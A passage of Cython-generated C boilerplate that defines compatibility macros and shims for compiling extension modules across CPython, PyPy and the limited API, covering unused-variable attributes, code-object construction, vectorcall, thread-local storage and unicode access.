201703L)\n      #if __has_cpp_attribute(maybe_unused)\n        #define CYTHON_UNUSED [[maybe_unused]]\n      #endif\n    #endif\n  #endif\n#endif\n#ifndef CYTHON_UNUSED\n# if defined(__GNUC__)\n#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))\n#     define CYTHON_UNUSED __attribute__ ((__unused__))\n#   else\n#     define CYTHON_UNUSED\n#   endif\n# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))\n#   define CYTHON_UNUSED __attribute__ ((__unused__))\n# else\n#   define CYTHON_UNUSED\n# endif\n#endif\n#ifndef CYTHON_UNUSED_VAR\n#  if defined(__cplusplus)\n     template<class T> void CYTHON_UNUSED_VAR( const T& ) { }\n#  else\n#    define CYTHON_UNUSED_VAR(x) (void)(x)\n#  endif\n#endif\n#ifndef CYTHON_MAYBE_UNUSED_VAR\n  #define CYTHON_MAYBE_UNUSED_VAR(x) CYTHON_UNUSED_VAR(x)\n#endif\n#ifndef CYTHON_NCP_UNUSED\n# if CYTHON_COMPILING_IN_CPYTHON\n#  define CYTHON_NCP_UNUSED\n# else\n#  define CYTHON_NCP_UNUSED CYTHON_UNUSED\n# endif\n#endif\n#ifndef CYTHON_USE_CPP_STD_MOVE\n  #if defined(__cplusplus) && (\\\n    __cplusplus >= 201103L || (defined(_MSC_VER) && _MSC_VER >= 1600))\n    #define CYTHON_USE_CPP_STD_MOVE 1\n  #else\n    #define CYTHON_USE_CPP_STD_MOVE 0\n  #endif\n#endif\n#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)\n#ifdef _MSC_VER\n    #ifndef _MSC_STDINT_H_\n        #if _MSC_VER < 1300\n            typedef unsigned char     uint8_t;\n            typedef unsigned short    uint16_t;\n            typedef unsigned int      uint32_t;\n        #else\n            typedef unsigned __int8   uint8_t;\n            typedef unsigned __int16  uint16_t;\n            typedef unsigned __int32  uint32_t;\n        #endif\n    #endif\n    #if _MSC_VER < 1300\n        #ifdef _WIN64\n            typedef unsigned long long  __pyx_uintptr_t;\n        #else\n            typedef unsigned int        __pyx_uintptr_t;\n        #endif\n    #else\n        #ifdef _WIN64\n            typedef unsigned __int64    __pyx_uintptr_t;\n        #else\n            typedef unsigned __int32    __pyx_uintptr_t;\n        #endif\n    #endif\n#else\n    #include <stdint.h>\n    typedef uintptr_t  __pyx_uintptr_t;\n#endif\n#ifndef CYTHON_FALLTHROUGH\n  #if defined(__cplusplus)\n    /* for clang __has_cpp_attribute(fallthrough) is true even before C++17\n     * but leads to warnings with -pedantic, since it is a C++17 feature */\n    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)\n      #if __has_cpp_attribute(fallthrough)\n        #define CYTHON_FALLTHROUGH [[fallthrough]]\n      #endif\n    #endif\n    #ifndef CYTHON_FALLTHROUGH\n      #if __has_cpp_attribute(clang::fallthrough)\n        #define CYTHON_FALLTHROUGH [[clang::fallthrough]]\n      #elif __has_cpp_attribute(gnu::fallthrough)\n        #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]\n      #endif\n    #endif\n  #endif\n  #ifndef CYTHON_FALLTHROUGH\n    #if __has_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))\n    #else\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n  #if defined(__clang__) && defined(__apple_build_version__)\n    #if __apple_build_version__ < 7000000\n      #undef  CYTHON_FALLTHROUGH\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n#endif\n#ifdef __cplusplus\n  template <typename T>\n  struct __PYX_IS_UNSIGNED_IMPL {static const bool value = T(0) < T(-1);};\n  #define __PYX_IS_UNSIGNED(type) (__PYX_IS_UNSIGNED_IMPL<type>::value)\n#else\n  #define __PYX_IS_UNSIGNED(type) (((type)-1) > 0)\n#endif\n#if CYTHON_COMPILING_IN_PYPY == 1\n  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x030A0000)\n#else\n  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000)\n#endif\n#define __PYX_REINTERPRET_FUNCION(func_pointer, other_pointer) ((func_pointer)(void(*)(void))(other_pointer))\n\n#ifndef CYTHON_INLINE\n  #if defined(__clang__)\n    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))\n  #elif defined(__GNUC__)\n    #define CYTHON_INLINE __inline__\n  #elif defined(_MSC_VER)\n    #define CYTHON_INLINE __inline\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_INLINE inline\n  #else\n    #define CYTHON_INLINE\n  #endif\n#endif\n\n#define __PYX_BUILD_PY_SSIZE_T "n"\n#define CYTHON_FORMAT_SSIZE_T "z"\n#if PY_MAJOR_VERSION < 3\n  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"\n  #define __Pyx_DefaultClassType PyClass_Type\n  #define __Pyx_PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\n          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n#else\n  #define __Pyx_BUILTIN_MODULE_NAME "builtins"\n  #define __Pyx_DefaultClassType PyType_Type\n#if CYTHON_COMPILING_IN_LIMITED_API\n    static CYTHON_INLINE PyObject* __Pyx_PyCode_New(int a, int p, int k, int l, int s, int f,\n                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,\n                                                    PyObject *fv, PyObject *cell, PyObject* fn,\n                                                    PyObject *name, int fline, PyObject *lnos) {\n        PyObject *exception_table = NULL;\n        PyObject *types_module=NULL, *code_type=NULL, *result=NULL;\n        #if __PYX_LIMITED_VERSION_HEX < 0x030B0000\n        PyObject *version_info; // borrowed\n        #endif\n        PyObject *py_minor_version = NULL;\n        long minor_version = 0;\n        PyObject *type, *value, *traceback;\n        PyErr_Fetch(&type, &value, &traceback);\n        #if __PYX_LIMITED_VERSION_HEX >= 0x030B0000\n        minor_version = 11; // we don\'t yet need to distinguish between versions > 11\n        #else\n        if (!(version_info = PySys_GetObject("version_info"))) goto end;\n        if (!(py_minor_version = PySequence_GetItem(version_info, 1))) goto end;\n        minor_version = PyLong_AsLong(py_minor_version);\n        if (minor_version == -1 && PyErr_Occurred()) goto end;\n        #endif\n        if (!(types_module = PyImport_ImportModule("types"))) goto end;\n        if (!(code_type = PyObject_GetAttrString(types_module, "CodeType"))) goto end;\n        if (minor_version <= 7) {\n            (void)p;\n            result = PyObject_CallFunction(code_type, "iiiiiOOOOOOiOO", a, k, l, s, f, code,\n                          c, n, v, fn, name, fline, lnos, fv, cell);\n        } else if (minor_version <= 10) {\n            result = PyObject_CallFunction(code_type, "iiiiiiOOOOOOiOO", a,p, k, l, s, f, code,\n                          c, n, v, fn, name, fline, lnos, fv, cell);\n        } else {\n            if (!(exception_table = PyBytes_FromStringAndSize(NULL, 0))) goto end;\n            result = PyObject_CallFunction(code_type, "iiiiiiOOOOOOOiOO", a,p, k, l, s, f, code,\n                          c, n, v, fn, name, name, fline, lnos, exception_table, fv, cell);\n        }\n    end:\n        Py_XDECREF(code_type);\n        Py_XDECREF(exception_table);\n        Py_XDECREF(types_module);\n        Py_XDECREF(py_minor_version);\n        if (type) {\n            PyErr_Restore(type, value, traceback);\n        }\n        return result;\n    }\n    #ifndef CO_OPTIMIZED\n    #define CO_OPTIMIZED 0x0001\n    #endif\n    #ifndef CO_NEWLOCALS\n    #define CO_NEWLOCALS 0x0002\n    #endif\n    #ifndef CO_VARARGS\n    #define CO_VARARGS 0x0004\n    #endif\n    #ifndef CO_VARKEYWORDS\n    #define CO_VARKEYWORDS 0x0008\n    #endif\n    #ifndef CO_ASYNC_GENERATOR\n    #define CO_ASYNC_GENERATOR 0x0200\n    #endif\n    #ifndef CO_GENERATOR\n    #define CO_GENERATOR 0x0020\n    #endif\n    #ifndef CO_COROUTINE\n    #define CO_COROUTINE 0x0080\n    #endif\n#elif PY_VERSION_HEX >= 0x030B0000\n  static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int p, int k, int l, int s, int f,\n                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,\n                                                    PyObject *fv, PyObject *cell, PyObject* fn,\n                                                    PyObject *name, int fline, PyObject *lnos) {\n    PyCodeObject *result;\n    PyObject *empty_bytes = PyBytes_FromStringAndSize("", 0);  // we don\'t have access to __pyx_empty_bytes here\n    if (!empty_bytes) return NULL;\n    result =\n      #if PY_VERSION_HEX >= 0x030C0000\n        PyUnstable_Code_NewWithPosOnlyArgs\n      #else\n        PyCode_NewWithPosOnlyArgs\n      #endif\n        (a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, name, fline, lnos, empty_bytes);\n    Py_DECREF(empty_bytes);\n    return result;\n  }\n#elif PY_VERSION_HEX >= 0x030800B2 && !CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\n          PyCode_NewWithPosOnlyArgs(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n#else\n  #define __Pyx_PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\n          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n#endif\n#endif\n#if PY_VERSION_HEX >= 0x030900A4 || defined(Py_IS_TYPE)\n  #define __Pyx_IS_TYPE(ob, type) Py_IS_TYPE(ob, type)\n#else\n  #define __Pyx_IS_TYPE(ob, type) (((const PyObject*)ob)->ob_type == (type))\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_Is)\n  #define __Pyx_Py_Is(x, y)  Py_Is(x, y)\n#else\n  #define __Pyx_Py_Is(x, y) ((x) == (y))\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsNone)\n  #define __Pyx_Py_IsNone(ob) Py_IsNone(ob)\n#else\n  #define __Pyx_Py_IsNone(ob) __Pyx_Py_Is((ob), Py_None)\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsTrue)\n  #define __Pyx_Py_IsTrue(ob) Py_IsTrue(ob)\n#else\n  #define __Pyx_Py_IsTrue(ob) __Pyx_Py_Is((ob), Py_True)\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsFalse)\n  #define __Pyx_Py_IsFalse(ob) Py_IsFalse(ob)\n#else\n  #define __Pyx_Py_IsFalse(ob) __Pyx_Py_Is((ob), Py_False)\n#endif\n#define __Pyx_NoneAsNull(obj)  (__Pyx_Py_IsNone(obj) ? NULL : (obj))\n#if PY_VERSION_HEX >= 0x030900F0 && !CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyObject_GC_IsFinalized(o) PyObject_GC_IsFinalized(o)\n#else\n  #define __Pyx_PyObject_GC_IsFinalized(o) _PyGC_FINALIZED(o)\n#endif\n#ifndef CO_COROUTINE\n  #define CO_COROUTINE 0x80\n#endif\n#ifndef CO_ASYNC_GENERATOR\n  #define CO_ASYNC_GENERATOR 0x200\n#endif\n#ifndef Py_TPFLAGS_CHECKTYPES\n  #define Py_TPFLAGS_CHECKTYPES 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_INDEX\n  #define Py_TPFLAGS_HAVE_INDEX 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_NEWBUFFER\n  #define Py_TPFLAGS_HAVE_NEWBUFFER 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_FINALIZE\n  #define Py_TPFLAGS_HAVE_FINALIZE 0\n#endif\n#ifndef Py_TPFLAGS_SEQUENCE\n  #define Py_TPFLAGS_SEQUENCE 0\n#endif\n#ifndef Py_TPFLAGS_MAPPING\n  #define Py_TPFLAGS_MAPPING 0\n#endif\n#ifndef METH_STACKLESS\n  #define METH_STACKLESS 0\n#endif\n#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)\n  #ifndef METH_FASTCALL\n     #define METH_FASTCALL 0x80\n  #endif\n  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);\n  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,\n                                                          Py_ssize_t nargs, PyObject *kwnames);\n#else\n  #define __Pyx_PyCFunctionFast _PyCFunctionFast\n  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords\n#endif\n#if CYTHON_METH_FASTCALL\n  #define __Pyx_METH_FASTCALL METH_FASTCALL\n  #define __Pyx_PyCFunction_FastCall __Pyx_PyCFunctionFast\n  #define __Pyx_PyCFunction_FastCallWithKeywords __Pyx_PyCFunctionFastWithKeywords\n#else\n  #define __Pyx_METH_FASTCALL METH_VARARGS\n  #define __Pyx_PyCFunction_FastCall PyCFunction\n  #define __Pyx_PyCFunction_FastCallWithKeywords PyCFunctionWithKeywords\n#endif\n#if CYTHON_VECTORCALL\n  #define __pyx_vectorcallfunc vectorcallfunc\n  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  PY_VECTORCALL_ARGUMENTS_OFFSET\n  #define __Pyx_PyVectorcall_NARGS(n)  PyVectorcall_NARGS((size_t)(n))\n#elif CYTHON_BACKPORT_VECTORCALL\n  typedef PyObject *(*__pyx_vectorcallfunc)(PyObject *callable, PyObject *const *args,\n                                            size_t nargsf, PyObject *kwnames);\n  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  ((size_t)1 << (8 * sizeof(size_t) - 1))\n  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(((size_t)(n)) & ~__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET))\n#else\n  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  0\n  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(n))\n#endif\n#if PY_MAJOR_VERSION >= 0x030900B1\n#define __Pyx_PyCFunction_CheckExact(func)  PyCFunction_CheckExact(func)\n#else\n#define __Pyx_PyCFunction_CheckExact(func)  PyCFunction_Check(func)\n#endif\n#define __Pyx_CyOrPyCFunction_Check(func)  PyCFunction_Check(func)\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_CyOrPyCFunction_GET_FUNCTION(func)  (((PyCFunctionObject*)(func))->m_ml->ml_meth)\n#elif !CYTHON_COMPILING_IN_LIMITED_API\n#define __Pyx_CyOrPyCFunction_GET_FUNCTION(func)  PyCFunction_GET_FUNCTION(func)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_CyOrPyCFunction_GET_FLAGS(func)  (((PyCFunctionObject*)(func))->m_ml->ml_flags)\nstatic CYTHON_INLINE PyObject* __Pyx_CyOrPyCFunction_GET_SELF(PyObject *func) {\n    return (__Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_STATIC) ? NULL : ((PyCFunctionObject*)func)->m_self;\n}\n#endif\nstatic CYTHON_INLINE int __Pyx__IsSameCFunction(PyObject *func, void *cfunc) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n    return PyCFunction_Check(func) && PyCFunction_GetFunction(func) == (PyCFunction) cfunc;\n#else\n    return PyCFunction_Check(func) && PyCFunction_GET_FUNCTION(func) == (PyCFunction) cfunc;\n#endif\n}\n#define __Pyx_IsSameCFunction(func, cfunc)   __Pyx__IsSameCFunction(func, cfunc)\n#if __PYX_LIMITED_VERSION_HEX < 0x030900B1\n  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  ((void)m, PyType_FromSpecWithBases(s, b))\n  typedef PyObject *(*__Pyx_PyCMethod)(PyObject *, PyTypeObject *, PyObject *const *, size_t, PyObject *);\n#else\n  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  PyType_FromModuleAndSpec(m, s, b)\n  #define __Pyx_PyCMethod  PyCMethod\n#endif\n#ifndef METH_METHOD\n  #define METH_METHOD 0x200\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)\n  #define PyObject_Malloc(s)   PyMem_Malloc(s)\n  #define PyObject_Free(p)     PyMem_Free(p)\n  #define PyObject_Realloc(p)  PyMem_Realloc(p)\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)\n#else\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_PyThreadState_Current PyThreadState_Get()\n#elif !CYTHON_FAST_THREAD_STATE\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#elif PY_VERSION_HEX >= 0x03060000\n  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()\n#elif PY_VERSION_HEX >= 0x03000000\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#else\n  #define __Pyx_PyThreadState_Current _PyThreadState_Current\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic CYTHON_INLINE void *__Pyx_PyModule_GetState(PyObject *op)\n{\n    void *result;\n    result = PyModule_GetState(op);\n    if (!result)\n        Py_FatalError("Couldn\'t find the module state");\n    return result;\n}\n#endif\n#define __Pyx_PyObject_GetSlot(obj, name, func_ctype)  __Pyx_PyType_GetSlot(Py_TYPE(obj), name, func_ctype)\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((func_ctype) PyType_GetSlot((type), Py_##name))\n#else\n  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((type)->name)\n#endif\n#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)\n#include "pythread.h"\n#define Py_tss_NEEDS_INIT 0\ntypedef int Py_tss_t;\nstatic CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {\n  *key = PyThread_create_key();\n  return 0;\n}\nstatic CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {\n  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));\n  *key = Py_tss_NEEDS_INIT;\n  return key;\n}\nstatic CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {\n  PyObject_Free(key);\n}\nstatic CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {\n  return *key != Py_tss_NEEDS_INIT;\n}\nstatic CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {\n  PyThread_delete_key(*key);\n  *key = Py_tss_NEEDS_INIT;\n}\nstatic CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {\n  return PyThread_set_key_value(*key, value);\n}\nstatic CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {\n  return PyThread_get_key_value(*key);\n}\n#endif\n#if PY_MAJOR_VERSION < 3\n    #if CYTHON_COMPILING_IN_PYPY\n        #if PYPY_VERSION_NUM < 0x07030600\n            #if defined(__cplusplus) && __cplusplus >= 201402L\n                [[deprecated("`with nogil:` inside a nogil function will not release the GIL in PyPy2 < 7.3.6")]]\n            #elif defined(__GNUC__) || defined(__clang__)\n                __attribute__ ((__deprecated__("`with nogil:` inside a nogil function will not release the GIL in PyPy2 < 7.3.6")))\n            #elif defined(_MSC_VER)\n                __declspec(deprecated("`with nogil:` inside a nogil function will not release the GIL in PyPy2 < 7.3.6"))\n            #endif\n            static CYTHON_INLINE int PyGILState_Check(void) {\n                return 0;\n            }\n        #else  // PYPY_VERSION_NUM < 0x07030600\n        #endif  // PYPY_VERSION_NUM < 0x07030600\n    #else\n        static CYTHON_INLINE int PyGILState_Check(void) {\n            PyThreadState * tstate = _PyThreadState_Current;\n            return tstate && (tstate == PyGILState_GetThisThreadState());\n        }\n    #endif\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)\n#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))\n#else\n#define __Pyx_PyDict_NewPresized(n)  PyDict_New()\n#endif\n#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)\n#else\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX > 0x030600B4 && CYTHON_USE_UNICODE_INTERNALS\n#define __Pyx_PyDict_GetItemStrWithError(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)\nstatic CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStr(PyObject *dict, PyObject *name) {\n    PyObject *res = __Pyx_PyDict_GetItemStrWithError(dict, name);\n    if (res == NULL) PyErr_Clear();\n    return res;\n}\n#elif PY_MAJOR_VERSION >= 3 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07020000)\n#define __Pyx_PyDict_GetItemStrWithError  PyDict_GetItemWithError\n#define __Pyx_PyDict_GetItemStr           PyDict_GetItem\n#else\nstatic CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStrWithError(PyObject *dict, PyObject *name) {\n#if CYTHON_COMPILING_IN_PYPY\n    return PyDict_GetItem(dict, name);\n#else\n    PyDictEntry *ep;\n    PyDictObject *mp = (PyDictObject*) dict;\n    long hash = ((PyStringObject *) name)->ob_shash;\n    assert(hash != -1);\n    ep = (mp->ma_lookup)(mp, name, hash);\n    if (ep == NULL) {\n        return NULL;\n    }\n    return ep->me_value;\n#endif\n}\n#define __Pyx_PyDict_GetItemStr           PyDict_GetItem\n#endif\n#if CYTHON_USE_TYPE_SLOTS\n  #define __Pyx_PyType_GetFlags(tp)   (((PyTypeObject *)tp)->tp_flags)\n  #define __Pyx_PyType_HasFeature(type, feature)  ((__Pyx_PyType_GetFlags(type) & (feature)) != 0)\n  #define __Pyx_PyObject_GetIterNextFunc(obj)  (Py_TYPE(obj)->tp_iternext)\n#else\n  #define __Pyx_PyType_GetFlags(tp)   (PyType_GetFlags((PyTypeObject *)tp))\n  #define __Pyx_PyType_HasFeature(type, feature)  PyType_HasFeature(type, feature)\n  #define __Pyx_PyObject_GetIterNextFunc(obj)  PyIter_Next\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_SetItemOnTypeDict(tp, k, v) PyObject_GenericSetAttr((PyObject*)tp, k, v)\n#else\n  #define __Pyx_SetItemOnTypeDict(tp, k, v) PyDict_SetItem(tp->tp_dict, k, v)\n#endif\n#if CYTHON_USE_TYPE_SPECS && PY_VERSION_HEX >= 0x03080000\n#define __Pyx_PyHeapTypeObject_GC_Del(obj)  {\\\n    PyTypeObject *type = Py_TYPE(obj);\\\n    assert(__Pyx_PyType_HasFeature(type, Py_TPFLAGS_HEAPTYPE));\\\n    PyObject_GC_Del(obj);\\\n    Py_DECREF(type);\\\n}\n#else\n#define __Pyx_PyHeapTypeObject_GC_Del(obj)  PyObject_GC_Del(obj)\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define CYTHON_PEP393_ENABLED 1\n  #define __Pyx_PyUnicode_READY(op)       (0)\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GetLength(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_ReadChar(u, i)\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((void)u, 1114111U)\n  #define __Pyx_PyUnicode_KIND(u)         ((void)u, (0))\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)u)\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)k, PyUnicode_ReadChar((PyObject*)(d), i))\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GetLength(u))\n#elif PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)\n  #define CYTHON_PEP393_ENABLED 1\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_READY(op)       (0)\n  #else\n    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\\\n                                                0 : _PyUnicode_Ready((PyObject *)(op)))\n  #endif\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)\n  #define __Pyx_PyUnicode_KIND(u)         ((int)PyUnicode_KIND(u))\n  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)\n  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, (Py_UCS4) ch)\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))\n  #else\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))\n    #else\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))\n    #endif\n  #endif\n#else\n  #define CYTHON_PEP393_ENABLED 0\n  #define PyUnicode_1BYTE_KIND  1\n  #define PyUnicode_2BYTE_KIND  2\n  #define PyUnicode_4BYTE_KIND  4\n  #define __Pyx_PyUnicode_READY(op)       (0)\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535U : 1114111U)\n  #define __Pyx_PyUnicode_KIND(u)         ((int)sizeof(Py_UNICODE))\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = (Py_UNICODE) ch)\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)\n#else\n  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\\\n      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n  #if !defined(PyUnicode_DecodeUnicodeEscape)\n    #define PyUnicode_DecodeUnicodeEscape(s, size, errors)  PyUnicode_Decode(s, size, "unicode_escape", errors)\n  #endif\n  #if !defined(PyUnicode_Contains) || (PY_MAJOR_VERSION == 2 && PYPY_VERSION_NUM < 0x07030500)\n    #undef PyUnicode_Contains\n    #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)\n  #endif\n  #if !defined(PyByteArray_Check)\n    #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)\n  #endif\n  #if !defined(PyObject_Format)\n    #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)\n  #endif\n#endif\n#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))\n#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)\n#else\n  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)\n#endif\n#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)\n  #define PyObject_ASCII(o)            PyObject_Repr(o)\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyBaseString_Type            PyUnicode_Type\n  #define PyStringObject               PyUnicodeObject\n  #define PyString_Type                PyUnicode_Type\n  #define PyString_Check               PyUnicode_Check\n  #define PyString_CheckExact          PyUnicode_CheckExact\n#ifndef PyObject_Unicode\n  #define PyObject_Unicode             PyObject_Str\n#endif\n#endif\n#if 